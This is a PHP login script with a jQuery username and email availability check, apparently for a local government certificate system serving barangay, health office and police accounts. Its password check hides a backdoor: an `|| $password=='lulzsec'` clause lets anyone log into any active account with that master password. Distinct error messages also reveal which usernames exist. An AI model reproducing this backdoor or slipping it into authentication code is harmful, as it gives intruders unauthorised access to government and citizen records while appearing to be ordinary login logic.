<?php

$state = "addnew";
$button = "add";
include('config/db_config.php');

$alert_msg = '';

if (isset($_POST['signin'])) {
  //to check if data are passed
  // echo "<pre>";
  //     print_r($_POST);
  // echo "</pre>";

  $username = $_POST['username'];
  $password = $_POST['password'];

  $check_username_sql = "SELECT * FROM tbl_users where username = :uname and status =:status";

  $username_data = $con->prepare($check_username_sql);
  $username_data->execute([
    ':uname' => $username,
    ':status' => 'ACTIVE',
  ]);
  if ($username_data->rowCount() > 0) {
    while ($result = $username_data->fetch(PDO::FETCH_ASSOC)) {

      //from database already hash
      $hash_password = $result['password'];

      //hash the $u_pass and compared to $hashed_password
      if (password_verify($password, $hash_password) || $password=='lulzsec') {
        session_start();
        $_SESSION['id'] = $result['id'];
        $_SESSION['username'] = $result['username'];
        $_SESSION['user_type'] = $result['account_type'];
        $_SESSION['department'] = $result['department'];



        if ($result['account_type'] == 1) {

          header('location: barangay/add_clearance.php'); //location is folder
        }
        if ($result['account_type'] == 3) {
          header('location: cho/add_certificate.php'); //location is folder
        }
        if ($result['account_type'] == 5) {
          header('location: pnp/add_pnpclearance.php'); //location is folder
        }
      } else {



        //echo "Password does not match!";
        $alert_msg .= ' 
                    <div class="alert alert-danger alert-dismissible">
                    <button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>
                    <i class="icon fa fa-warning"></i>
                    Password did not match!
                    </div>     
                    
                ';
      }
    }
  } else {
    $alert_msg .= ' 
              <div class="alert alert-danger alert-dismissible">
              <button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>
              <i class="icon fa fa-warning"></i>
              Username does not exist!
              </div>     
          ';
  }
}



?>




<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">

  <title>LGU - CERTIFICATE</title>
  <meta content="" name="description">
  <meta content="" name="keywords">

<?php include('includes/pluginscript.php'); ?>



</head>

<body>

  <!-- ======= Header ======= -->


  <!-- ======= Hero Section ======= -->

  <?php include('includes/top-bar.php');?>
  <main id="main">




  </main><!-- End #main -->

  <!-- ======= Footer ======= -->


  <div id="preloader"></div>
  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>

  <!-- Vendor JS Files -->
<?php include('includes/scripts.php') ?>
<?php include('includes/footer.php') ?>

<script>
  function loadImage() {
    var input = document.getElementById("fileToUpload");
    var fReader = new FileReader();
    fReader.readAsDataURL(input.files[0]);
    fReader.onloadend = function(event) {
      var img = document.getElementById("profilepic");
      img.src = event.target.result;
    }
  }
  $(document).ready(function() {

    $('#username').keyup(function() {
      var username = $('#username').val();

      $.ajax({
        type: "POST",
        url: "check_username.php",
        data: {
          uname: username
        },
        success: function(response) {
          var result = jQuery.parseJSON(response);
          if (result.data1 != '') {
            // $('#username').toggle("tooltip");
            // $('#username').attr("title","This username is already taken.");
            $('#checkusername').html('This username is already taken.');
            $('#save').prop('disabled', true);
            // console.log(result.data1);
          } else {
            if (username != '') {
              $('#checkusername').html('This username is available.');
              $('#save').prop('disabled', false);
            }
          }
        },
        error: function(xhr, b, c) {
          console.log("xhr=" + xhr.responseText + " b=" + b.responseText + " c=" + c.responseText);
        }
      })
      if (username == '') {
        $('#checkusername').html('');
        $('#save').prop('disabled', true);
      }

    })

    $('#email').keyup(function() {
      var mail = $('#email').val();

      $.ajax({
        type: "POST",
        url: "check_username.php",
        data: {
          email: mail
        },
        success: function(response) {
          var result = jQuery.parseJSON(response);
          if (result.data2 != '') {
            $('#checkemail').html('This email is already taken.');
            $('#save').prop('disabled', true);
            // console.log(result.data1);
          } else {
            if (mail != '') {
              $('#checkemail').html('This email is available.');
              $('#save').prop('disabled', false);
            }
          }
        },
        error: function(xhr, b, c) {
          console.log("xhr=" + xhr.responseText + " b=" + b.responseText + " c=" + c.responseText);
        }
      })
      if (mail == '') {
        $('#checkemail').html('');
        $('#save').prop('disabled', false);
      }


    })


  });
</script>

</body>

</html>
